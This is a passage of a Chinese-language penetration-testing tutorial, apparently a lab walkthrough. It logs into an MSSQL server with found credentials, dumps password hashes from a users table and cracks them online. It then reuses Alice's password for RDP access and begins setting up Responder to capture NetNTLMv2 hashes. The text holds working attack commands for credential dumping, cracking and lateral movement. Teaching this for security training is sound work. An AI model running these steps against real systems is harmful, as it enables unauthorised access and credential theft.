<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mssqlclient.py -p 1433 bob:&#x27;P@ssw0rd&#x27;@172.16.1.250 -windows-auth</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<blockquote>
<p>注：使用 mssqlclient.py 时可能会出现无法连接的情况，仅提示“Encryption required, switching to TLS”信息，此时可以参考这个<a href="https://github.com/fortra/impacket/issues/827#issuecomment-652966362" target="_blank" rel="noopener noreferrer">帖子</a> 中修改 tds.py 文件的办法解决问题。</p>
</blockquote>
<p>要使用 sqsh 登录，我们可以使用以下命令：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sqsh -S 172.16.1.250 -U bob -P &#x27;P@ssw0rd&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161831490-1090570068-450ed9914f8be34cab71ca416345fda7.png" width="556" height="125" class="img_ev3q"></p>
<p>现在我们已经登录 MSSQL 服务器，接下来，需要从中提取一些信息。首先从 MSSQL 数据库帐户开始。</p>
<blockquote>
<p>在 MSSQL 中执行的每条命令，后面都要跟 go 。</p>
</blockquote>
<div class="language-mssql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-mssql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then &#x27;Disabled&#x27; else &#x27;Enabled&#x27; end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in (&#x27;G&#x27;, &#x27;R&#x27;) order by sp.name;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161830786-2029331511-fe0457008c51617366b604ed18fef39a.png" width="414" height="464" class="img_ev3q"></p>
<p>在这里，我们看到有两个用户，分别是 bob 和 sa，而这两个账户都已启用。但由于 bob 不是特权帐户，因此无法看到 bob 和 sa 帐户的密码哈希值。</p>
<blockquote>
<p>sa 帐户是 MSSQL 内置的超级用户帐户，具有完全管理权限。</p>
</blockquote>
<p>接着，查看 MSSQL 数据库中存在的库名称。</p>
<div class="language-mssql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-mssql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">SELECT name FROM master.dbo.sysdatabases</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161831012-791768710-bc8dfa502c6338ab9731b6626976d166.png" width="383" height="666" class="img_ev3q"></p>
<p>从列出的库中可以看到 customdb 库很突出，因此，可以先进入该库，然后使用以下两条命令列出该库的所有表：</p>
<div class="language-mssql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-mssql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use customdb;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SELECT * FROM customdb.INFORMATION_SCHEMA.TABLES;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">go</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161831251-464846688-eb4358af49ba97c10a6ba677cd2468fd.png" width="185" height="757" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIQAAADsCAIAAAA6gZnHAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAASdEVYdFNvZnR3YXJlAEdyZWVuc2hvdF5VCAUAAAxjSURBVHhe7Z3/U9R1HsedaeY6o1gQVlBWDbFQy+O0dCK7lI6+qV1aZlp+6XLK8ryuMb38ct7UjHdyypHfki8piIqC3xAN0eObuLCgwAJ/0d1neT6l5SXr3hLz2rV9Pebxw7LP7eN+9hHgNM28xzU0NIwzYoCqqio+MmKIgT6fGUWZAYjNVJYZgNhMZZkBiM1UlhmA2ExlmQGIzVSWGYDYTGWZAYjNVJYZgNhMZZkBiM1UlhmA2ExlmQGIzVSWGYDYTGWZAYjNVJYZgNhMZZkBiM1UlhmA2ExlmQGIzVSWGYDYTGWZAYjNVJYZgNh+WXa0FK1btv1Eb+Cxt2bnsg376/qGvSD6MgMQW3T1X9i99rP9jb3y+dHafn17TkL+3juBx22HlrrmfFHtH/aC6MsMQGzRtbvotcTZm670yOdHazzGaLtWuG7RU6muxKS06fNXfVPp8weeDLr54A/F19d4aPMr2RkTJ6alpWc+t2R7RUO/83x32aYcjyf1sUcedU3yeDzTXvxrbTuv33lu3+rnMtPdbvfkOcu+OuvtcJ7sLno9Y9F7q+dPSc+Y+9H2P76clZaevfJwS2Dqbyvblv+Ue0LK5Bkvrsh7cnxQjJkrP/vwhayMCYnu2cv2Xmnj9aMqMwCxjcKu8tWZyTmfll7t6WvvvHr43yfqBgOEiuE9vWFKUt6epsC//t7b5w+erPcOXWqk74y2Mx9Pdy/cesXnG+g6/02e27PqcNfgK5+YuuJYS1vF2oyk3K11nXW7FriWfud8vo1HV6S783bUdfr83lO78lKCYiSMn/X+kYa2gZ76o+96EhZsaxizn4ejlxmA2CK39fCypEmrjnTL50PFaK/f+Xzi5IWfF5TWe3/KAEeI0V2y1pP01sFbfMGxt90TV5TeDbwy6aVdbX5v9Sczsj4u9/f9Z++ihPx/tQ50Fb6dPHFV2e3B14f8MeU/ve7JhEUF3sE/IqoyAxBbxPbW7Zw/fs4XNbjJIEPF8A34Gy8Vbl6TnzM1JTU7/9Oyxns/jkaMcafgjQTPhpPM5j/7Udb4RQW+kDH6W3YuHJ+95RKuGTJG39U/54yfu/PGT390tGQGILbIbSl6I3Hy+9/3yOdDxxiy8/yul1zudw4OfVc5vwlc939nZMjvjLIHfGd0FixJ9KxnvJAxek+umZL4+8KOwT8iqjIDENso7Di23JM8d1PJlTu93va6Q4VltYM37C1fPcmz5ljgg/ad3rEw+d7P7uaafV8fvNDQ4/f1+2pEjN7KD6a58w80tw/4W1ubmwO/2PtuVaydmrJwa63zO6OzZk+e+8kPj+F3xsgx/PX/fCU5a32p85qBOzV7Fk0I+p3xeMrvtl7wtg/cvbzvjXT36/9oC/xFI8oyAxDbqGy5vHdV7vQJCY8lps+Yv/Jv5R2DN9lTu/PNp6fMyl2c/+ryL9cvcOFD8d+s2v1ublZKoit1kidz3tIt5c5HP3Sp3mvFHy+YMsE1IXXS7FUFrfiwOir/vvw3GSnJqW7PvJW7LzlVHhDD+VHWsH/DghnZc3MX5y37bNXcx4O/M95a/fKMdOcvWtNf/qQs+M+NnswAxGYqywxAbKayzADEZirLDEBsprLMAMRmKssMQGymsswAxGYqywxAbKayzADEZirLDEBsprLMAMRmKssMQGymsswAxGYqywxAbKayzADEZirLDEBsprLMAMRmKssMQGymsswAxGYqywxAbKayzADEZirLDEBsprLMAMRmKssMQGymsswAxGYqywxAbKayzADEZirLDEBsprLMAMRmKssMQGymsswAxGYqywxAbKayzADEZirLDEBsprLMAMRmKssMQGymsswAxGYqywxAbKayzADEZirLDEBsprLMAMRmKssMQGymsswAxGYqywxAbKayzADEZirLDEBsprLMAMRmKssMQGymsswAxGYqywxAbKayzADEZirLDEBsprLMAMRmKssMQGymsswAxGYqywxAbKayzADEZirLDEBsprLMAMRmKssMQGymsswAxGYqywxAbKayzADEZirLDEBsprLMAMRmKssMQGymsswAxGYqywxAbKayzADEZirLDEBsprLMAMT283wIzt+ONZkBiO3nGfLESDOUzADE9vO0GBHLDEBsozDi87dHOt87bmUGILbIjfT87ZHP977vsvEiMwCxRWyk52+HON8bX8ahzADEFqkRn78d4nxvfBmHMgMQW8RGev52iPO98WUcygxAbBEb8fnb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" width="132" height="236" class="img_ev3q"></p>
<p>可以看到该库有四个表：custom、test、xtr、users。</p>
<blockquote>
<p>通常，当我们想转储数据库的表时，最希望看到的就是表名字里有“user”或“password”的字样。当然，它的表现形式可能有多种，比如“usr”和“pwd”。</p>
</blockquote>
<p>由于 user 表是最令人感兴趣的表，因此我们先从那里开始。</p>
<div class="language-mssql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-mssql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">SELECT * FROM users;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">go</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161831071-1137698687-217e997755e4dc16985bcc931d81b0a7.png" width="1024" height="724" class="img_ev3q"></p>
<p>BOOM！我们从 customdb 数据库的 users 表中转储了所有的用户名和密码哈希值！</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="22破解发现的哈希"><strong><div id="id2.2">2.2、破解发现的哈希</div></strong><a href="#22破解发现的哈希" class="hash-link" aria-label="22破解发现的哈希的直接链接" title="22破解发现的哈希的直接链接">​</a></h4>
<p>现在我们得到了三个哈希值，下一件事就是确定哈希值的类型，这可以使用名为 <a href="https://github.com/blackploit/hash-identifier" target="_blank" rel="noopener noreferrer">hash-identifier</a> 的工具来完成。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161831411-1013293002-12a3c2524644e6a4c4e524a7e16339f5.png" width="362" height="121" class="img_ev3q"></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python hash-id.py &#x27;75c2f6c0653c84f057fa82be2f59aec1&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161836424-955993542-45b2c556e20be6d4cd6d0c7d8526653e.png" width="628" height="690" class="img_ev3q"></p>
<p>这款工具之所以比 hashid 更胜一筹，是因为它会对被检测的哈希值进行一个人性化的判断（最可能是...有可能是...）。</p>
<p>鉴于 md5 是最有可能被使用的哈希类型，因此，在本例中，我们将不再使用常用的 hashcat，而是使用一个名为 <a href="https://crackstation.net/" target="_blank" rel="noopener noreferrer">crackstation</a> 的网站去破解它。</p>
<blockquote>
<p>Crackstation 拥有一个包含 15 亿条记录的庞大查找表，可用于快速破解使用常见哈希算法的哈希值，例如：LM、NTLM、md2、md4、md5、md5（md5_hex）、md5-half、sha1、sha224、sha256、sha384、sha512、ripeMD160、whirlpool、MySQL 4.1+ （sha1（sha1_bin））、QubesV3.1BackupDefaults。</p>
</blockquote>
<p>我们可以一次将所有要破解的哈希值全部输入到 crackstation 中，然后看它是否能够破解其中任何一个。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161831624-1943008185-65511d58f591c68077e78d0633966a25.png" width="954" height="260" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161831469-1243537452-f1fa5593aaf253007c4440364eddd58b.png" width="1013" height="148" class="img_ev3q"></p>
<p>Amazing！网站成功破解了其中两个密码。其中一个是我们已经知道的 &quot;P@ssw0rd&quot;，它属于 bob；然而，第二个密码 &quot;Password123!&quot; 属于 Alice 的哈希值。</p>
<p><strong>Alice : Password123!</strong></p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="23权限横向移动"><strong><div id="id2.3">2.3、权限横向移动</div></strong><a href="#23权限横向移动" class="hash-link" aria-label="23权限横向移动的直接链接" title="23权限横向移动的直接链接">​</a></h4>
<p>现在我们已经找到了另一个用户的凭证，可以再次使用 crackmapexec 以确认它是否有效。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">crackmapexec smb 172.16.1.250 -u Alice -p &#x27;Password123!&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161835419-514733747-80207903229fe1837defcaf4d6201119.png" width="1024" height="121" class="img_ev3q"></p>
<p>可以看到该凭证有效但是不能通过 SMB 登录系统。这也说明了 Alice 在应用程序（可能是网站）中的凭证与她登录系统的凭证是相同的。</p>
<blockquote>
<p>密码重用是个大问题啊！</p>
</blockquote>
<p>现在，我们需要在所有可能的地方（RDP、WinRM、SMB 等）去尝试这个凭证，以查看此账户具有哪些 服务的访问权限。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo python3 rdp_checker.py -u alice -p &#x27;Password123!&#x27; 172.16.1.250</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161832054-1716632824-af5711a29883207a0cf9d48a1c35d757.png" width="868" height="205" class="img_ev3q"></p>
<p>Perfect！使用 RDP 检查器，我们发现用户 alice 是远程桌面用户组的成员，可以通过 RDP 访问系统。</p>
<p>现在使用以下命令登录系统：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo xfreerdp /u:alice /p:&#x27;Password123!&#x27; /v:172.16.1.250 +clipboard</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161832882-2122065716-ea5c7ad6b9a7b22dcdd08cfb45147dc3.png" width="1024" height="829" class="img_ev3q"></p>
<p>Amazing！我们成功地进行了水平权限提升，同时也增加了我们的访问权限！</p>
<p>回顾一下：</p>
<ul>
<li>我们先在一个 SMB 共享文件夹中找到了用户 bob 的凭据。</li>
<li>接着发现用户 bob 没有办法登录目标机器，但可以对 MSSQL 服务器进行访问。</li>
<li>然后枚举 MSSQL 自定义数据库，在 customdb 数据库的 users 表中发现 Alice 的密码哈希。</li>
<li>破解 Alice 的密码哈希后，我们发现该账户密码也是用户登录系统时使用的密码。</li>
<li>最后，我们发现 Alice 是 Remote Desktop Users 组的一部分，然后通过 RDP 登录系统。</li>
</ul>
<p>由于我们能够获得第二个用户的凭据，并利用该凭据增加对目标的访问权限，因此本小节示例其实是一个横向权限提升的例子。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="3场景二转储-mssql-服务账户的哈希"><strong><div id="id3">3、场景二：转储 MSSQL 服务账户的哈希</div></strong><a href="#3场景二转储-mssql-服务账户的哈希" class="hash-link" aria-label="3场景二转储-mssql-服务账户的哈希的直接链接" title="3场景二转储-mssql-服务账户的哈希的直接链接">​</a></h2>
<p>我们不可能总是会那么幸运，可以在数据库中找到可以轻松破解的密码哈希。但是，还有其它方法可用于尝试攻击此服务。</p>
<p>在本场景中，假设我们还是使用上面找到的 bob 用户凭证访问 MSSQL，但这次在数据库中没有找到任何可以被破解的哈希值。同时，我们发现 bob 作为一个低权限账户，它什么都做不了。</p>
<p>当发现自己处于这种情况时，我们可以通过尝试连接不存在的 SMB 共享来滥用 MSSQL 服务器本身的权限。通过运行 Responder 工具，我们能够截获 对<strong>不存在共享</strong> 发起的请求，并转储其中 MSSQL 服务帐户的哈希值。</p>
<blockquote>
<p>只有当服务运行的账户是普通用户账户或服务账户时，这种技术才有用。如果服务以 SYSTEM 身份运行，那么即便能捕获到哈希值也无法破解。</p>
</blockquote>
<p>首先，我们需要启动 Responder。但在此之前，需要使用 ip a 命令检查网卡的名称。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161832260-1530061494-511dd718513716d951bc0696e88158bd.png" width="812" height="241" class="img_ev3q"></p>
<p>可以看到 eth0 是我们想要监听的网卡。现在，可以使用以下命令启动 Responder：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">responder -I eth0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161832100-1430341034-916fa582d0de7f80c538677711d91c5a.png" width="465" height="627" class="img_ev3q"></p>
<blockquote>
<p>SMB 服务器的状态必须是 ON，我们才能继续下面的工作。</p>
</blockquote>
<p>现在，我们已经将 Responder 运行了起来，然后就可以在数据库中使用以下命令尝试访问不存在的共享，以让 Responder 能够拦截请求并转储 MSSQL 服务账户的 NetNTLMv2 哈希值。</p>
